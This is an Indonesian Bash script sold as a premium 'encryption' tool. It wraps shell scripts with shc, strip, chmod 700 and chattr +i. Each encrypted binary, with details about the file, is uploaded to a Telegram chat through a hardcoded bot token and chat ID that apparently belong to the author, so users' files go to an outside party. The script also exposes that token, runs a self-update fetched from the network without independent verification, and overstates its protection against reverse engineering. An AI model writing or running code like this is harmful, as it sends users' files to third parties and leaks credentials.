#!/bin/bash

# ================================================
#   SHC SUPER ENCRYPTION PRO v2 (Nexus x Rama)
#   SHC + STRIP + CHMOD + IMMUTABLE + AUTOUPDATE
#   Premium UI + Telegram Notification + FILE SEND
# ================================================

# Warna
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[36m"
MAGENTA="\e[35m"
NC="\e[0m"

# Versi lokal tools
LOCAL_VERSION="2.0"

# ==== TELEGRAM NOTIFICATION ====
TG_TOKEN="8178123942:AAGZaNxo-8HajTk7LIM3rVn_N_0zTq7LNBM"
TG_CHATID="6403937911"

# --- KIRIM TEKS TELEGRAM ---
send_tele() {
    TEXT="$1"
    curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
        -d chat_id="${TG_CHATID}" \
        -d text="${TEXT}" \
        -d parse_mode="HTML" >/dev/null 2>&1
}

# --- KIRIM FILE KE TELEGRAM ---
send_file() {
    FILE_PATH="$1"
    curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendDocument" \
        -F chat_id="${TG_CHATID}" \
        -F document=@"${FILE_PATH}" \
        -F caption="🔥 FILE HASIL ENKRIPSI: <b>${FILE_PATH}</b>" \
        -F parse_mode="HTML" >/dev/null 2>&1
}

# ==== URL UPDATE ====
UPDATE_URL="https://raw.githubusercontent.com/nexus-bot-dev/encnexus/main/enc-pro.sh"
CHECKSUM_URL="https://raw.githubusercontent.com/nexus-bot-dev/encnexus/main/enc-pro.sha256"
VERSION_URL="https://raw.githubusercontent.com/nexus-bot-dev/encnexus/main/version.txt"

# ================================================
# HEADER
# ================================================
header() {
    clear
    echo -e "${BLUE}======================================================="
    echo -e "       SHC SUPER ENCRYPTION TOOLS PRO v${LOCAL_VERSION}"
    echo -e "            Premium Style by Nexus x Rama"
    echo -e "=======================================================${NC}"
    echo ""
}

# ================================================
# LOADING
# ================================================
loading() {
    echo -ne "${MAGENTA}"
    for i in {1..35}; do
        echo -ne "▉"
        sleep 0.03
    done
    echo -e "${NC}"
}

# ================================================
# SUCCESS VIEW
# ================================================
rama_view() {
    clear
    echo -e "${BLUE}"
    echo "╔══════════════════════════════════════════════════════╗"
    echo "║                     \e[92mENCRYPT SUCCESS\e[36m                    ║"
    echo "╠══════════════════════════════════════════════════════╣"
    echo -e "║ Script berhasil diamankan dengan teknologi premium:   ║"
    echo -e "║   \e[92m✔\e[36m SHC Encryption                                      ║"
    echo -e "║   \e[92m✔\e[36m Binary Stripped (Anti Reverse Engineering)           ║"
    echo -e "║   \e[92m✔\e[36m Permission Locked (Mode 700)                          ║"
    echo -e "║   \e[92m✔\e[36m Immutable ON (Anti Delete / Anti Modify)              ║"
    echo "╠══════════════════════════════════════════════════════╣"
    echo -e "║ Nama Asli     : \e[93m$1\e[36m"
    echo -e "║ Output Binary : \e[93m$2\e[36m"
    echo "╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# ================================================
# AUTO UPDATE
# ================================================
update_tools() {
    header
    echo -e "${YELLOW}[+] Mengecek versi terbaru...${NC}"

    LATEST_VERSION=$(curl -s "$VERSION_URL")

    [[ -z "$LATEST_VERSION" ]] && echo -e "${RED}Gagal mengecek update.${NC}" && sleep 2 && menu

    if [[ "$LATEST_VERSION" == "$LOCAL_VERSION" ]]; then
        echo -e "${GREEN}Sudah versi terbaru.${NC}"
        sleep 2
        menu
    fi

    echo -e "${BLUE}[+] Update tersedia v$LATEST_VERSION${NC}"
    wget -q -O enc-pro.sh.new "$UPDATE_URL"
    wget -q -O enc-pro.sha256 "$CHECKSUM_URL"

    [[ ! -f enc-pro.sh.new ]] && echo -e "${RED}Gagal download update.${NC}" && sleep 2 && menu

    sha256sum -c enc-pro.sha256 &>/dev/null || {
        echo -e "${RED}Checksum tidak valid!${NC}"
        rm -f enc-pro.sh.new enc-pro.sha256
        sleep 2
        menu
    }

    mv enc-pro.sh.new enc-pro.sh
    chmod +x enc-pro.sh

    echo -e "${GREEN}Update berhasil! Restart...${NC}"
    sleep 1
    ./enc-pro.sh
    exit
}

# ================================================
# ENCRYPT SCRIPT
# ================================================
encrypt_file() {
    header
    echo -e "${YELLOW}Masukkan nama file script (.sh) yang ingin dienkripsi:${NC}"
    read -p "File: " FILE

    [[ ! -f "$FILE" ]] && echo -e "${RED}File tidak ditemukan!${NC}" && sleep 2 && encrypt_file

    # install SHC jika belum ada
    if ! command -v shc >/dev/null; then
        echo -e "${YELLOW}SHC belum terinstall, menginstall...${NC}"
        apt update && apt install shc -y
    fi

    NAME=$(basename "$FILE" .sh)
    OUTPUT="$NAME"

    echo -e "${BLUE}[1] Enkripsi SHC...${NC}"
    shc -f "$FILE" -o "$OUTPUT"

    echo -e "${BLUE}[2] Strip binary...${NC}"
    strip "$OUTPUT"

    echo -e "${BLUE}[3] chmod 700...${NC}"
    chmod 700 "$OUTPUT"

    echo -e "${BLUE}[4] Aktifkan immutable...${NC}"
    chattr +i "$OUTPUT"

    SIZE=$(du -h "$OUTPUT" | awk '{print $1}')

    # 🔥 Notifikasi Telegram
    send_tele "<b>🔥 ENCRYPT BERHASIL</b>%0AFile: <code>$FILE</code>%0AOutput: <code>$OUTPUT</code>%0AUkuran: <b>$SIZE</b>%0AWaktu: <b>$(date '+%Y-%m-%d %H:%M:%S')</b>"

    # 📁 Kirim file binary ke Telegram
    send_file "$OUTPUT"

    loading
    rama_view "$FILE" "$OUTPUT"

    read -p "ENTER untuk kembali..."
    menu
}

# ================================================
# LIST FILE
# ================================================
list_files() {
    header
    echo -e "${GREEN}Daftar file .sh:${NC}"
    ls -1 *.sh 2>/dev/null || echo -e "${RED}Tidak ada file!${NC}"
    echo ""
    read -p "ENTER kembali..."
    menu
}

# ================================================
# TUTORIAL
# ================================================
how_to_use() {
    header
    echo -e "${YELLOW}Cara Menggunakan:${NC}"
    echo "- Simpan script .sh kamu"
    echo "- Jalankan tools: ./enc-pro.sh"
    echo "- Pilih Encrypt File"
    echo "- File terenkripsi langsung terkirim ke Telegram"
    echo ""
    echo "Unlock immutable:"
    echo "  chattr -i nama_file"
    echo ""
    read -p "ENTER untuk kembali..."
    menu
}

# ================================================
# MENU
# ================================================
menu() {
    header
    echo -e "${YELLOW}Pilih Menu:${NC}"
    echo "1) Encrypt file (.sh)"
    echo "2) Lihat daftar file .sh"
    echo "3) Tutorial"
    echo "4) Update Tools"
    echo "0) Exit"
    echo ""
    read -p "Pilih: " opt

    case $opt in
        1) encrypt_file ;;
        2) list_files ;;
        3) how_to_use ;;
        4) update_tools ;;
        0) exit ;;
        *) echo -e "${RED}Pilihan salah!${NC}" ; sleep 1 ; menu ;;
    esac
}

menu
